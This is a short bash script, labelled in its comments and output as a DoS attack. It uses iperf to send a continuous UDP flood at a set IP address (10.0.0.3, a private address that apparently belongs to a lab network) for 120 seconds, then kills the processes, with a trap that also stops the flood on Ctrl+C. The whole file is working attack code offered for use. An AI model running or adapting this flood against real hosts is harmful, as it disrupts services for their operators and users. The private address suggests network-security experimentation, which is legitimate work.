#!/bin/bash

# Settings
DESTINATION_IP="10.0.0.3"  # Destination IP address
BANDWIDTH="10M"  # Bandwidth for each iperf instance

# Function to handle interruption (Ctrl+C)
cleanup() {
    echo "Attack finished."
    
    # Stop the DoS attack
    echo "Stopping all iperf processes"
    pkill -f "iperf -u -c $DESTINATION_IP -b $BANDWIDTH -t 9999"
    
    exit 0
}

# Set the trap function to catch SIGINT (Ctrl+C)
trap cleanup SIGINT

# Start the attack with iperf
echo "Starting the DoS attack with iperf..."
iperf -u -c $DESTINATION_IP -b $BANDWIDTH -t 9999 &

# Wait a bit to ensure the attack has started
sleep 120

# Stop the attack
echo "Stopping the DoS attack..."
pkill -f "iperf -u -c $DESTINATION_IP -b $BANDWIDTH -t 9999"
